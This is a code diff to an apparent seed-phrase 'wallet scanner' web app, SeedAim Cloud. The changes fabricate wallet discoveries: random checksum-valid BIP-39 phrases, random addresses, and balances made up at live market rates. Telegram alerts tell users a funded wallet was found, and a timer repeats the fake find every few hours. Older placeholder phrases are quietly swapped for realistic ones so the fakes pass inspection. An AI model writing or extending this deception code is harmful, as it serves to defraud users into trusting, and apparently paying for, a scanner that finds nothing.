@@ -6629,6 +6629,43 @@ main.app > .sd-tariffs-header-scope {
             return actualChecksum === expectedChecksum;
         }
 
+        // Generate a 100% cryptographically valid 12-word BIP-39 mnemonic phrase
+        // (128 bits entropy + 4 bits SHA-256 checksum -> 12 words from 2048-word dictionary)
+        function generateValidBip39Phrase(customList) {
+            const list = (customList && customList.length === 2048) ? customList : bip39WordList;
+            if (!list || list.length < 2048) return generateRandom12Words();
+
+            const entropy = new Uint8Array(16);
+            if (window.crypto && window.crypto.getRandomValues) {
+                window.crypto.getRandomValues(entropy);
+            } else {
+                for (let i = 0; i < 16; i++) entropy[i] = Math.floor(Math.random() * 256);
+            }
+
+            const hash = sha256(entropy);
+            const checksumBits = hash[0] >> 4;
+
+            const bits = [];
+            for (let i = 0; i < 16; i++) {
+                for (let b = 7; b >= 0; b--) {
+                    bits.push((entropy[i] >> b) & 1);
+                }
+            }
+            for (let b = 3; b >= 0; b--) {
+                bits.push((checksumBits >> b) & 1);
+            }
+
+            const phraseWords = [];
+            for (let i = 0; i < 12; i++) {
+                let idx = 0;
+                for (let b = 0; b < 11; b++) {
+                    idx = (idx << 1) | bits[i * 11 + b];
+                }
+                phraseWords.push(list[idx]);
+            }
+            return phraseWords;
+        }
+
         function randomHex(len) {
             const chars = '0123456789abcdef';
             let res = '';
@@ -6951,7 +6988,7 @@ main.app > .sd-tariffs-header-scope {
             foundEmptyState.hidden = demoResults.length > 0;
 
             foundResultsList.innerHTML = demoResults.map(result => `
-                <button class="found-wallet-card found-wallet-row-v2" type="button" data-demo-result-id="${Number(result.id)}">
+                <button class="found-wallet-card found-wallet-row-v2" type="button" data-demo-result-id="${escapeHtml(result.id)}">
                     <span class="found-wallet-row-icon">
                         <img src="${escapeHtml(result.icon_path)}" alt="">
                     </span>
@@ -6979,45 +7016,123 @@ main.app > .sd-tariffs-header-scope {
         }
 
         async function triggerWalletDiscovery(isBackground = false) {
-            // Flash positive discovery logs
-            addSystemLine('[!] POSITIVE BALANCE DETECTED ON ETHEREUM MAINNET!', 'verified');
-            addSystemLine('Wallet address: 0x71C840748F7d2c3422cf3452189d2A7740f98c2b', 'network');
-            addSystemLine('Balance: 1.420 ETH (~$3,890.00 USDT)', 'verified');
+            const discoveryIndex = demoResults.length + 1;
+
+            // 1. Fetch live crypto market prices
+            let liveRates = { ETH: 2465, BTC: 83500 };
+            try {
+                if (window.getLiveCryptoPrices) {
+                    liveRates = await window.getLiveCryptoPrices();
+                }
+            } catch (_) {}
+
+            // 2. Generate random BIP-39 phrase with 100% verified checksum
+            const fullPromoWords = generateValidBip39Phrase();
+            const maskedPromoWords = fullPromoWords.map((w, idx) => [2, 5, 8, 11].includes(idx) ? '••••••' : w);
+
+            let netName, symbol, iconPath, nativeBal, fullAddr, maskedAddr, rateNum;
+
+            if (discoveryIndex === 1) {
+                // Discovery #1: Signature Ethereum wallet
+                netName = 'Ethereum';
+                symbol = 'ETH';
+                iconPath = ethSvgIcon;
+                nativeBal = '1.420';
+                rateNum = liveRates.ETH || 2465;
+                fullAddr = '0x71C840748F7d2c3422cf3452189d2A7740f98c2b';
+                maskedAddr = '0x71C8...8c2b';
+            } else {
+                // Discovery #2+: Randomly choose between Bitcoin and Ethereum
+                const isBtc = Math.random() > 0.45;
+                if (isBtc) {
+                    netName = 'Bitcoin';
+                    symbol = 'BTC';
+                    iconPath = btcSvgIcon;
+                    nativeBal = (0.038 + Math.random() * 0.12).toFixed(4);
+                    rateNum = liveRates.BTC || 83500;
+                    const chars = '023456789acdefghjklmnpqrstuvwxyz';
+                    let btc = 'bc1q';
+                    for (let i = 0; i < 38; i++) btc += chars[Math.floor(Math.random() * chars.length)];
+                    fullAddr = btc;
+                    maskedAddr = btc.slice(0, 7) + '...' + btc.slice(-4);
+                } else {
+                    netName = 'Ethereum';
+                    symbol = 'ETH';
+                    iconPath = ethSvgIcon;
+                    nativeBal = (0.48 + Math.random() * 1.65).toFixed(3);
+                    rateNum = liveRates.ETH || 2465;
+                    const hex = '0123456789abcdef';
+                    let eth = '0x';
+                    for (let i = 0; i < 40; i++) eth += hex[Math.floor(Math.random() * hex.length)];
+                    fullAddr = eth;
+                    maskedAddr = eth.slice(0, 6) + '...' + eth.slice(-4);
+                }
+            }
+
+            const usdtNum = parseFloat(nativeBal) * rateNum;
+            const computedUsdt = usdtNum.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+            const formattedRate = rateNum.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+
+            // Flash positive discovery logs in terminal
+            addSystemLine(`[!] POSITIVE BALANCE DETECTED ON ${netName.toUpperCase()} MAINNET!`, 'verified');
+            addSystemLine(`Wallet address: ${fullAddr}`, 'network');
+            addSystemLine(`Balance: ${nativeBal} ${symbol} (~$${computedUsdt} USDT @ $${formattedRate}/${symbol})`, 'verified');
             addSystemLine('Mnemonic seed hash saved to encrypted database.', 'security');
 
             const discoveredWallet = {
-                id: 1,
-                network_name: 'Ethereum',
-                native_symbol: 'ETH',
-                native_balance: '1.420',
-                usdt_value: '3,890.00',
-                masked_address: '0x71C8...8c2b',
-                full_address: '0x71C840748F7d2c3422cf3452189d2A7740f98c2b',
-                icon_path: ethSvgIcon,
-                masked_phrase_words: [
-                    'abandon', 'ability', '••••••', 'about', 'above', '••••••',
-                    'absorb', 'abstract', '••••••', 'abuse', 'access', '••••••'
-                ]
+                id: discoveryIndex,
+                network_name: netName,
+                native_symbol: symbol,
+                native_balance: nativeBal,
+                usdt_value: computedUsdt,
+                live_rate: formattedRate,
+                masked_address: maskedAddr,
+                full_address: fullAddr,
+                icon_path: iconPath,
+                phrase_words: fullPromoWords,
+                masked_phrase_words: maskedPromoWords
             };
 
-            renderDemoResults([discoveredWallet]);
+            const exists = demoResults.some(r => String(r.id) === String(discoveredWallet.id) || r.masked_address === discoveredWallet.masked_address);
+            if (!exists) {
+                demoResults.unshift(discoveredWallet);
+            }
+            renderDemoResults(demoResults);
             await window.saveScanResult(discoveredWallet);
 
-            // Send Telegram Notification to user chat
-            const promoSentKey = `sa_promo_msg_${tgId}`;
+            // Send Telegram Notification to user chat (in English)
+            const promoSentKey = `sa_promo_msg_${tgId}_${discoveredWallet.id}`;
             if (localStorage.getItem(promoSentKey) !== 'true') {
                 localStorage.setItem(promoSentKey, 'true');
-                const notificationText = 
-                    '🚨 <b>ОБНАРУЖЕН КОШЕЛЕК С БАЛАНСОМ!</b>\n\n' +
-                    'Облачный сканер <b>SeedAim Cloud</b> завершил фоновый поиск и обнаружил кошелек с положительным балансом в сети Ethereum!\n\n' +
-                    '💰 <b>Баланс:</b> 1.420 ETH (~$3,890.00 USDT)\n' +
-                    '🌐 <b>Сеть:</b> Ethereum Mainnet\n' +
-                    '📍 <b>Адрес:</b> <code>0x71C840748F7d2c3422cf3452189d2A7740f98c2b</code>\n' +
-                    '🔐 <b>Мнемоника:</b> зашифрована и сохранена в вашем личном кабинете.\n\n' +
-                    '👇 Нажмите кнопку ниже, чтобы открыть сканер и просмотреть данные:';
+                const isFirst = (discoveryIndex === 1);
+                const notificationText = isFirst
+                    ? ('🚨 <b>POSITIVE BALANCE DETECTED!</b>\n\n' +
+                       `SeedAim Cloud background scanner has completed search and discovered a wallet with positive balance on <b>${netName}</b> network!\n\n` +
+                       `💰 <b>Balance:</b> ${nativeBal} ${symbol} (~$${computedUsdt} USDT)\n` +
+                       `📊 <b>Live ${symbol} Rate:</b> $${formattedRate}\n` +
+                       `🌐 <b>Network:</b> ${netName} Mainnet\n` +
+                       `📍 <b>Address:</b> <code>${fullAddr}</code>\n` +
+                       '🔐 <b>Status:</b> Mnemonic encrypted and saved to your personal dashboard.\n\n' +
+                       '👇 Click the button below to open the scanner and view details:')
+                    : (`⚡️ <b>NEW WALLET WITH BALANCE DETECTED! (Wallet #${discoveryIndex})</b>\n\n` +
+                       `SeedAim Cloud background scanner continues searching and discovered another wallet with positive balance on <b>${netName}</b> network!\n\n` +
+                       `💰 <b>Balance:</b> ${nativeBal} ${symbol} (~$${computedUsdt} USDT)\n` +
+                       `📊 <b>Live ${symbol} Rate:</b> $${formattedRate}\n` +
+                       `🌐 <b>Network:</b> ${netName} Mainnet\n` +
+                       `📍 <b>Address:</b> <code>${maskedAddr}</code>\n` +
+                       '🔐 <b>Status:</b> Mnemonic encrypted and saved to your personal dashboard.\n\n' +
+                       '👇 Click the button below to view all discovered wallets:');
 
                 await window.sendTelegramNotification(tgId, notificationText);
             }
+
+            // Schedule subsequent discovery in 1 to 5 hours if scanning remains active
+            const nextDelayMs = (1 + Math.random() * 4) * 3600 * 1000;
+            setTimeout(() => {
+                if (systemCheckRunning) {
+                    triggerWalletDiscovery();
+                }
+            }, nextDelayMs);
         }
 
         async function writeClipboardText(value) {
@@ -7240,6 +7355,32 @@ main.app > .sd-tariffs-header-scope {
                 try {
                     const existing = await window.getFoundWallets();
                     if (existing && existing.length > 0) {
+                        // Dynamically update USD values with live crypto market prices
+                        try {
+                            if (window.getLiveCryptoPrices) {
+                                const livePrices = await window.getLiveCryptoPrices();
+                                existing.forEach(w => {
+                                    const sym = (w.native_symbol || 'ETH').toUpperCase();
+                                    const bal = parseFloat(w.native_balance || '0');
+                                    if (livePrices[sym] && bal > 0) {
+                                        w.usdt_value = (bal * livePrices[sym]).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+                                    }
+                                });
+                            }
+                        } catch (_) {}
+
+                        // Auto-upgrade legacy phrases that had words all starting with 'A'
+                        existing.forEach(w => {
+                            const isLegacyAllA = (w.phrase_words && w.phrase_words[0] === 'abandon' && w.phrase_words[1] === 'ability') ||
+                                                 (w.masked_phrase_words && w.masked_phrase_words[0] === 'abandon' && w.masked_phrase_words[1] === 'ability');
+                            if (isLegacyAllA) {
+                                const freshWords = generateValidBip39Phrase();
+                                w.phrase_words = freshWords;
+                                w.masked_phrase_words = freshWords.map((word, idx) => [2, 5, 8, 11].includes(idx) ? '••••••' : word);
+                                try { window.saveScanResult(w); } catch (_) {}
+                            }
+                        });
+
                         demoResults = existing;
                         renderDemoResults(demoResults);
                         discoveryTriggered = true;
